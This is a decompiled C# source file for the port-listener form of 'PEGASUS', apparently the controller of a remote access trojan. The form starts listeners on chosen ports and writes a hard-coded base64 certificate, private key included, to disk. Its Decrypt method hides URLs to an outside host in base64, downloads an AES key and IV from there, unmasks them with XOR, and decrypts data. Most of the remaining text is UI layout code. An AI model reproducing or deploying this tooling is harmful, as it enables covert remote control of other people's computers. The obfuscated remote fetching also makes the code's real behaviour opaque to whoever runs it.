using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Helper;
using PEGASUS.Properties;

namespace PEGASUS.Forms
{

	public class FormPorts : Form
	{
		private static bool isOK;

		private IContainer components;

		private Label label1;

		private ListBox listBox1;

		private Guna2GradientButton button1;

		private Guna2GradientButton btnAdd;

		private Guna2GradientButton btnDelete;

		private Guna2TextBox textPorts;

		private Guna2PictureBox guna2PictureBox1;

		private Guna2Panel guna2Panel1;

		private Label label2;

		private PictureBox pictureBox1;

		private Guna2Separator guna2Separator1;

		private Label label3;

		private Guna2Panel guna2Panel2;

		private Guna2GradientButton guna2GradientButton1;

		private Label label6;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		public FormPorts()
		{
			InitializeComponent();
			base.Opacity = 0.0;
		}

		private void PortsFrm_Load(object sender, EventArgs e)
		{
			Methods.FadeIn(this, 5);
			if (PEGASUS.Properties.Settings.Default.Ports.Length == 0)
			{
				listBox1.Items.AddRange(new object[1] { "4449" });
			}
			else
			{
				try
				{
					string[] array = PEGASUS.Properties.Settings.Default.Ports.Split(new string[1] { "," }, StringSplitOptions.None);
					foreach (string text in array)
					{
						if (!string.IsNullOrWhiteSpace(text))
						{
							listBox1.Items.Add(text.Trim());
						}
					}
				}
				catch
				{
				}
			}
			Text = Settings.Version + " | Welcome " + Environment.UserName;
			if (!File.Exists(Settings.CertificatePath))
			{
				Hide();
				checkfiles();
			}
			else
			{
				Settings.PEGASUSCertificate = new X509Certificate2(Settings.CertificatePath);
			}
		}

		public void checkfiles()
		{
			byte[] bytes = Convert.FromBase64String("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");
			File.WriteAllBytes(Settings.CertificatePath, bytes);
			string path = Path.Combine(Application.StartupPath, "Plugins");
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (!File.Exists(Path.Combine(Application.StartupPath, "Plugins\\ip2region.db")))
			{
				File.WriteAllBytes(Path.Combine(Application.StartupPath, "Plugins\\ip2region.db"), Resources.ip2region);
			}
		}

		private static string info(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				char value = (char)(array[i] ^ c);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}

		private static string reupload(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				char value = (char)(array[i] ^ c);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}

		public static string Decrypt(string encrypted)
		{
			using WebClient webClient = new WebClient();
			webClient.Proxy = null;
			string str = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2tleS50eHQ=")));
			string str2 = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2l2LnR4dA==")));
			byte[] array = Convert.FromBase64String(encrypted);
			AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.BlockSize = 128;
			aesCryptoServiceProvider.KeySize = 256;
			aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(reupload(str));
			aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(reupload(str2));
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
			byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
			cryptoTransform.Dispose();
			return Encoding.ASCII.GetString(bytes);
		}

		private void button1_Click(object sender, EventArgs e)
		{
			if (!File.Exists(Path.Combine(Path.GetTempPath(), "PEGASUSCertificate.p12")))
			{
				Application.Exit();
			}
			if (listBox1.Items.Count <= 0)
			{
				return;
			}
			string text = "";
			foreach (string item in listBox1.Items)
			{
				text = text + item + ",";
			}
			PEGASUS.Properties.Settings.Default.Ports = text.Remove(text.Length - 1);
			PEGASUS.Properties.Settings.Default.Save();
			isOK = true;
			Close();
		}

		private void PortsFrm_FormClosed(object sender, FormClosedEventArgs e)
		{
			if (!isOK)
			{
				Program.form1.notifyIcon1.Dispose();
				Environment.Exit(0);
			}
		}

		private void BtnAdd_Click(object sender, EventArgs e)
		{
			try
			{
				Convert.ToInt32(textPorts.Text.Trim());
				listBox1.Items.Add(textPorts.Text.Trim());
				textPorts.Clear();
			}
			catch
			{
			}
		}

		private void BtnDelete_Click(object sender, EventArgs e)
		{
			listBox1.Items.Remove(listBox1.SelectedItem);
		}

		private void guna2PictureBox1_Click(object sender, EventArgs e)
		{
			if (!File.Exists(Path.Combine(Path.GetTempPath(), "PEGASUSCertificate.p12")))
			{
				Application.Exit();
			}
			Close();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		private void guna2Panel1_MouseDown_1(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormPorts));
			label1 = new System.Windows.Forms.Label();
			listBox1 = new System.Windows.Forms.ListBox();
			button1 = new Guna.UI2.WinForms.Guna2GradientButton();
			btnAdd = new Guna.UI2.WinForms.Guna2GradientButton();
			btnDelete = new Guna.UI2.WinForms.Guna2GradientButton();
			textPorts = new Guna.UI2.WinForms.Guna2TextBox();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
			guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			label2 = new System.Windows.Forms.Label();
			label3 = new System.Windows.Forms.Label();
			guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
			label6 = new System.Windows.Forms.Label();
			guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			guna2Panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			guna2Panel2.SuspendLayout();
			SuspendLayout();
			label1.AutoSize = true;
			label1.Location = new System.Drawing.Point(38, 95);
			label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(29, 14);
			label1.TabIndex = 1;
			label1.Text = "Port";
			listBox1.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
			listBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
			listBox1.ForeColor = System.Drawing.Color.LightGray;
			listBox1.FormattingEnabled = true;
			listBox1.ItemHeight = 14;
			listBox1.Location = new System.Drawing.Point(290, 112);
			listBox1.Margin = new System.Windows.Forms.Padding(2);
			listBox1.Name = "listBox1";
			listBox1.Size = new System.Drawing.Size(176, 154);
			listBox1.TabIndex = 4;
			button1.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			button1.BorderThickness = 1;
			button1.CheckedState.Parent = button1;
			button1.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			button1.CustomImages.Parent = button1;
			button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			button1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			button1.DisabledState.Parent = button1;
			button1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			button1.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			button1.Font = new System.Drawing.Font("Electrolize", 9f);
			button1.ForeColor = System.Drawing.Color.White;
			button1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			button1.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			button1.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			button1.HoverState.ForeColor = System.Drawing.Color.LightGray;
			button1.HoverState.Parent = button1;
			button1.Location = new System.Drawing.Point(41, 151);
			button1.Name = "button1";
			button1.ShadowDecoration.Parent = button1;
			button1.Size = new System.Drawing.Size(244, 32);
			button1.TabIndex = 9;
			button1.Text = "Start Listener";
			button1.Click += new System.EventHandler(button1_Click);
			btnAdd.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnAdd.BorderThickness = 1;
			btnAdd.CheckedState.Parent = btnAdd;
			btnAdd.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnAdd.CustomImages.Parent = btnAdd;
			btnAdd.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnAdd.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnAdd.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnAdd.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnAdd.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnAdd.DisabledState.Parent = btnAdd;
			btnAdd.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnAdd.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnAdd.Font = new System.Drawing.Font("Electrolize", 9f);
			btnAdd.ForeColor = System.Drawing.Color.White;
			btnAdd.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnAdd.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnAdd.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			btnAdd.HoverState.ForeColor = System.Drawing.Color.LightGray;
			btnAdd.HoverState.Parent = btnAdd;
			btnAdd.Location = new System.Drawing.Point(41, 191);
			btnAdd.Name = "btnAdd";
			btnAdd.ShadowDecoration.Parent = btnAdd;
			btnAdd.Size = new System.Drawing.Size(244, 32);
			btnAdd.TabIndex = 10;
			btnAdd.Text = "Add Port";
			btnAdd.Click += new System.EventHandler(BtnAdd_Click);
			btnDelete.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnDelete.BorderThickness = 1;
			btnDelete.CheckedState.Parent = btnDelete;
			btnDelete.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnDelete.CustomImages.Parent = btnDelete;
			btnDelete.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnDelete.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnDelete.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnDelete.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnDelete.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnDelete.DisabledState.Parent = btnDelete;
			btnDelete.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnDelete.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnDelete.Font = new System.Drawing.Font("Electrolize", 9f);
			btnDelete.ForeColor = System.Drawing.Color.White;
			btnDelete.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnDelete.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnDelete.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			btnDelete.HoverState.ForeColor = System.Drawing.Color.LightGray;
			btnDelete.HoverState.Parent = btnDelete;
			btnDelete.Location = new System.Drawing.Point(41, 231);
			btnDelete.Name = "btnDelete";
			btnDelete.ShadowDecoration.Parent = btnDelete;
			btnDelete.Size = new System.Drawing.Size(244, 32);
			btnDelete.TabIndex = 11;
			btnDelete.Text = "Remove Port";
			btnDelete.Click += new System.EventHandler(BtnDelete_Click);
			textPorts.Animated = true;
			textPorts.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			textPorts.Cursor = System.Windows.Forms.Cursors.IBeam;
			textPorts.DefaultText = "";
			textPorts.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			textPorts.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			textPorts.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textPorts.DisabledState.Parent = textPorts;
			textPorts.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textPorts.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			textPorts.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
			textPorts.FocusedState.Parent = textPorts;
			textPorts.Font = new System.Drawing.Font("Electrolize", 9f);
			textPorts.ForeColor = System.Drawing.Color.White;
			textPorts.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
			textPorts.HoverState.Parent = textPorts;
			textPorts.Location = new System.Drawing.Point(41, 112);
			textPorts.Name = "textPorts";
			textPorts.PasswordChar = '\0';
			textPorts.PlaceholderText = "";
			textPorts.SelectedText = "";
			textPorts.ShadowDecoration.Parent = textPorts;
			textPorts.Size = new System.Drawing.Size(244, 22);
			textPorts.TabIndex = 12;
			guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(471, 12);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
			guna2PictureBox1.Size = new System.Drawing.Size(29, 27);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox1.TabIndex = 13;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
			guna2Panel1.Controls.Add(guna2Separator1);
			guna2Panel1.Controls.Add(pictureBox1);
			guna2Panel1.Controls.Add(guna2PictureBox1);
			guna2Panel1.Controls.Add(label2);
			guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
			guna2Panel1.Location = new System.Drawing.Point(0, 0);
			guna2Panel1.Name = "guna2Panel1";
			guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
			guna2Panel1.Size = new System.Drawing.Size(512, 67);
			guna2Panel1.TabIndex = 14;
			guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown_1);
			guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2Separator1.BackColor = System.Drawing.Color.Transparent;
			guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2Separator1.Location = new System.Drawing.Point(-393, 61);
			guna2Separator1.Name = "guna2Separator1";
			guna2Separator1.Size = new System.Drawing.Size(1299, 10);
			guna2Separator1.TabIndex = 13;
			guna2Separator1.UseTransparentBackground = true;
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(12, 12);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(40, 42);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox1.TabIndex = 12;
			pictureBox1.TabStop = false;
			label2.AutoSize = true;
			label2.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label2.Location = new System.Drawing.Point(230, 20);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(55, 19);
			label2.TabIndex = 11;
			label2.Text = "NOTE";
			label3.AutoSize = true;
			label3.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label3.Location = new System.Drawing.Point(221, 74);
			label3.Name = "label3";
			label3.Size = new System.Drawing.Size(70, 16);
			label3.TabIndex = 15;
			label3.Text = "Welcome!!";
			label3.Visible = false;
			guna2Panel2.Controls.Add(label6);
			guna2Panel2.Controls.Add(guna2GradientButton1);
			guna2Panel2.Dock = System.Windows.Forms.DockStyle.Fill;
			guna2Panel2.Location = new System.Drawing.Point(0, 67);
			guna2Panel2.Name = "guna2Panel2";
			guna2Panel2.ShadowDecoration.Parent = guna2Panel2;
			guna2Panel2.Size = new System.Drawing.Size(512, 243);
			guna2Panel2.TabIndex = 16;
			label6.AutoSize = true;
			label6.Font = new System.Drawing.Font("Electrolize", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label6.Location = new System.Drawing.Point(73, 57);
			label6.Name = "label6";
			label6.Size = new System.Drawing.Size(368, 90);
			label6.TabIndex = 121;
			label6.Text = resources.GetString("label6.Text");
			guna2GradientButton1.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			guna2GradientButton1.BorderThickness = 1;
			guna2GradientButton1.CheckedState.Parent = guna2GradientButton1;
			guna2GradientButton1.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton1.CustomImages.Parent = guna2GradientButton1;
			guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			guna2GradientButton1.DisabledState.Parent = guna2GradientButton1;
			guna2GradientButton1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2GradientButton1.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton1.ForeColor = System.Drawing.Color.White;
			guna2GradientButton1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton1.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton1.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton1.HoverState.ForeColor = System.Drawing.Color.LightGray;
			guna2GradientButton1.HoverState.Parent = guna2GradientButton1;
			guna2GradientButton1.Location = new System.Drawing.Point(135, 199);
			guna2GradientButton1.Name = "guna2GradientButton1";
			guna2GradientButton1.ShadowDecoration.Parent = guna2GradientButton1;
			guna2GradientButton1.Size = new System.Drawing.Size(244, 32);
			guna2GradientButton1.TabIndex = 10;
			guna2GradientButton1.Text = "Ok";
			guna2GradientButton1.Click += new System.EventHandler(button1_Click);
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(512, 310);
			base.Controls.Add(guna2Panel2);
			base.Controls.Add(label3);
			base.Controls.Add(textPorts);
			base.Controls.Add(btnDelete);
			base.Controls.Add(btnAdd);
			base.Controls.Add(button1);
			base.Controls.Add(listBox1);
			base.Controls.Add(label1);
			base.Controls.Add(guna2Panel1);
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ForeColor = System.Drawing.Color.LightGray;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(2);
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "FormPorts";
			base.ShowInTaskbar = false;
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Listen ports";
			base.TopMost = true;
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(PortsFrm_FormClosed);
			base.Load += new System.EventHandler(PortsFrm_Load);
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			guna2Panel1.ResumeLayout(false);
			guna2Panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			guna2Panel2.ResumeLayout(false);
			guna2Panel2.PerformLayout();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
